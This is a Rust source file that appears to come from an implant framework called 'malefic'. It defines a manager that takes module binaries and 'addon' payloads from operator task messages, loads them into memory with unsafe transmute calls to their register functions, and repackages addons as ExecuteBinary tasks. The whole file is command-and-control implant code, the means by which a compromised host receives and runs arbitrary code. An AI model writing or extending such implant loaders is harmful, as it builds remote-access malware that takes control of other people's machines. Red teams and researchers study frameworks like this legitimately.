use std::collections::HashMap;
use malefic_helper::common::hot_modules;
use malefic_helper::debug;
use malefic_helper::protobuf::implantpb;
use malefic_helper::protobuf::implantpb::{Addon, Spite};
use malefic_helper::protobuf::implantpb::spite::Body;
use modules::{check_field, MaleficModule};
use crate::check_body;
use crate::common::common::new_spite;
use crate::common::error::MaleficError;

type ModuleRegister = extern "C" fn () -> HashMap<String, Box<MaleficModule>>;
type ModuleMap = HashMap<String, Box<MaleficModule>>;

pub struct MaleficAddon {
    name: String,
    r#type: String,
    depend: String,
    content: Vec<u8>,
}

pub struct MaleficManager {
    bundles: HashMap<String, ModuleRegister>,
    pub(crate) modules: Box<ModuleMap>,
    addons: HashMap<String, Box<MaleficAddon>>
}

impl MaleficManager{
    pub(crate) fn new() -> Self {
        MaleficManager {
            bundles: HashMap::new(),
            modules: Box::new(HashMap::new()),
            addons: HashMap::new()
        }
    }

    pub(crate) fn clean(&mut self) {
        self.modules.clear();
        self.addons.clear();
    }

    pub(crate) fn refresh(&mut self) -> Result<(), MaleficError> {
        self.bundles.clear();
        self.bundles.insert("origin".to_string(), modules::register_modules as ModuleRegister);
        self.reload()
    }

    fn reload(&mut self) -> Result<(), MaleficError> {
        for (name, bundle) in self.bundles.iter() {
            let bundle_modules = bundle();
            debug!("refresh module: {} {:?}", name, bundle_modules.keys());
            for (module_name, module) in bundle_modules {
                self.modules.insert(module_name.to_string(), module);
            }
        }
        Ok(())
    }
    pub(crate) fn load_module(&mut self, spite: Spite) -> Result<(), MaleficError> {
        // let body = spite.body.ok_or_else(|| MaleficError::MissBody)?;
        let module = check_body!(spite, Body::LoadModule)?;
        let bin = check_field!(module.bin)?;
        let bundle_name = check_field!(module.bundle)?;
        unsafe {
            let bundle = hot_modules::load_module(bin, bundle_name.clone())
                .map_err(|_| MaleficError::ModuleError)?;

            let ret = hot_modules::call_fresh_modules(bundle)
                .ok_or_else(|| MaleficError::ModuleError)?;

            let register_func: ModuleRegister = core::mem::transmute(ret);
            self.bundles.insert(bundle_name.to_string(), register_func);

            let bundle_modules = register_func();
            debug!("load modules: {} {:?}", bundle_name.to_string(), bundle_modules.keys());
            for (module_name, module) in bundle_modules {
                self.modules.insert(module_name.to_string(), module);
            }

            debug!("[+] modules insert succ!");
        }

        Ok(())
    }

    pub(crate) fn list_module(&self, internal: Vec<String>) -> Vec<String> {
        let mut modules: Vec<String> = self.modules.keys().cloned().collect();
        modules.extend(internal);
        modules
    }

    pub(crate) fn get_module(&self, name: &String) -> Option<&Box::<MaleficModule>> {
        self.modules.get(name)
    }

    fn get_addon(&self, name: &String) -> Option<&Box::<MaleficAddon>> {
        self.addons.get(name)
    }

    pub(crate) fn list_addon(&self) -> Vec<Addon> {
        let mut addons = Vec::new();
        for (name, module) in self.addons.iter() {
            addons.push(implantpb::Addon{
                name: name.clone(),
                r#type: module.r#type.clone(),
                depend: module.depend.clone(),
            })
        }
        addons
    }

    pub(crate) fn load_addon(&mut self, spite: Spite) -> Result<(), MaleficError> {
        // let body = spite.body.ok_or_else(|| MaleficError::MissBody)?;
        let ext = check_body!(spite, Body::LoadAddon)?;

        let addon = MaleficAddon {
            name: check_field!(ext.name)?,
            r#type: ext.r#type,
            depend: check_field!(ext.depend)?,
            content: check_field!(ext.bin)?,
        };
        self.addons.insert(addon.name.clone(), Box::new(addon));
        Ok(())
    }

    pub(crate) fn execute_addon(&self, spite: Spite) -> Result<Spite, MaleficError> {
        let ext = check_body!(spite, Body::ExecuteAddon)?;

        let addon = self.get_addon(&check_field!(ext.addon)?).ok_or_else(|| MaleficError::AddonNotFound)?;
        if self.get_module(&addon.depend).is_none() {
            return Err(MaleficError::ModuleNotFound);
        }

        let mut execute_binary = ext.execute_binary.clone().unwrap();
        execute_binary.bin = addon.content.clone();
        execute_binary.name = addon.name.clone();
        let result = new_spite(spite.task_id, addon.depend.clone(), Body::ExecuteBinary(execute_binary));

        Ok(result)
    }
}